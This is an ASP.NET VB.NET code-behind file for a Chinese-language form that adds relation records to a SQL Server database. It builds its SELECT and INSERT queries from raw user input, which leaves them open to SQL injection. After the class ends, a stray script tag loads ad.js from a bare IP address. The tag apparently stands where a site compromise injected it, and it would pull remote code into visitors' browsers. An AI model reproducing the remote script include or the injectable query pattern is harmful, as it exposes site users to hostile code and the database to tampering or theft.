Imports System.Data
Imports System.Data.SqlClient

Public Class rinstancepublish
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Label10 As System.Web.UI.WebControls.Label
    Protected WithEvents Label3 As System.Web.UI.WebControls.Label
    Protected WithEvents Label5 As System.Web.UI.WebControls.Label
    Protected WithEvents Label2 As System.Web.UI.WebControls.Label
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents Label6 As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnAccPri3 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri2 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri1 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents Label4 As System.Web.UI.WebControls.Label
    Protected WithEvents txtInstKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents ddlstDefSearch As System.Web.UI.WebControls.DropDownList
    Protected WithEvents rbtnInstAvailYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnInstAvailNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents txtUser As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtOper As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtInstType As System.Web.UI.WebControls.TextBox
    Protected WithEvents btnNext As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码
        Me.lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()

        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If

        If Not IsPostBack Then  ' 用户x第一次打开页面时
            Me.rbtnInstAvailYes.Checked = True
            Me.rbtnAccPri1.Checked = True
            Me.txtUser.Text = Me.Session("UserName")
            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Try
                mySqlConn.Open()

                Dim mySqlAdapter As New SqlDataAdapter("select * from rdefinition", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "rdefinition")
                Me.ddlstDefSearch.DataSource = myDateSet.Tables("rdefinition").DefaultView
                Me.ddlstDefSearch.DataValueField = "rdefinitionkey"
                Me.ddlstDefSearch.DataBind()
                mySqlConn.Close()
            Catch ex As SqlException
                Throw ex
                'Response.Redirect("error.htm") ' 错误提示
            Finally
            End Try
        End If
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.lblWarning.Visible = False
        Me.rbtnAccPri2.Checked = False
        Me.rbtnAccPri3.Checked = False
        Me.rbtnAccPri1.Checked = True
        Me.rbtnInstAvailNo.Checked = False
        Me.rbtnInstAvailYes.Checked = True
        Me.txtInstKey.Text = ""
        Me.txtInstType.Text = ""
        Me.txtOper.Text = ""
        Me.txtUser.Text = Me.Session("UserName")
        Me.ddlstDefSearch.SelectedIndex = 0
    End Sub

    Private Sub btnNext_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNext.Click
        If (Me.txtInstKey.Text.Trim() = "" Or Me.txtInstType.Text.Trim() = "" Or Me.txtOper.Text.Trim() = "" Or Me.txtUser.Text.Trim() = "") Then
            Me.lblWarning.Text = "提醒：请先填好全部信息"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = "select * from rinstance where relationkey='" + Me.txtInstKey.Text.Trim() + "'"
        ' 查看rRefinitionKey是否已否在
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.lblWarning.Text = "警告：该关系类型编号已存在，请输入新的关系类型编号"
                lblWarning.Visible = True
            Else
                ' 获取用户权限值，有效性值,是否需要关联对象的确认信息,是否有向
                ' 保存在chrAccPri, chrIsValid，chrNeedAff和chrIsDir中
                Dim chrAccPri As Char
                Dim chrIsValid As Char
              
                If Me.rbtnAccPri1.Checked = True Then
                    chrAccPri = "1"
                ElseIf Me.rbtnAccPri2.Checked = True Then
                    chrAccPri = "2"
                Else
                    chrAccPri = "3"
                End If
                If Me.rbtnInstAvailYes.Checked = True Then
                    chrIsValid = "1"
                Else
                    chrIsValid = "0"
                End If

                ' 插入数据项
                strSql = [String].Format("Insert into rinstance values('{0}','{1}','{2}','{3}','{4}','{5}','{6}','{7}','{8}','{9}')", _
                    Me.txtInstKey.Text.Trim(), Me.ddlstDefSearch.SelectedValue.Trim(), chrAccPri, _
                    Now.ToString("yyyy-MM-dd HH:mm:ss"), Now.ToString("yyyy-MM-dd HH:mm:ss"), _
                    Now.ToString("yyyy-MM-dd HH:mm:ss"), Me.txtUser.Text.Trim(), _
                    Me.txtOper.Text.Trim(), Me.txtInstType.Text.Trim(), chrIsValid)
                mySqlConn.Close()
                mySqlComm.CommandText = strSql
                mySqlConn.Open()
                If (mySqlComm.ExecuteNonQuery() > 0) Then
                    Me.lblWarning.Text = "恭喜：添加关系实例成功" + Me.txtInstKey.Text.Trim() + "成功"
                    Me.lblWarning.Visible = True
                    Me.Session("InstKey") = Me.txtInstKey.Text.Trim()
                    Me.Session("DefKey") = Me.ddlstDefSearch.SelectedValue.Trim()
                    Me.Response.Redirect("addrvertex.aspx")
                Else
                    Me.lblWarning.Text = "警告：由于某种原因添加关系实例失败，可能你没有权限"
                    Me.lblWarning.Visible = True
                End If
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            If sqlReader.IsClosed = False Then
                sqlReader.Close()
                mySqlConn.Close()
            End If
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
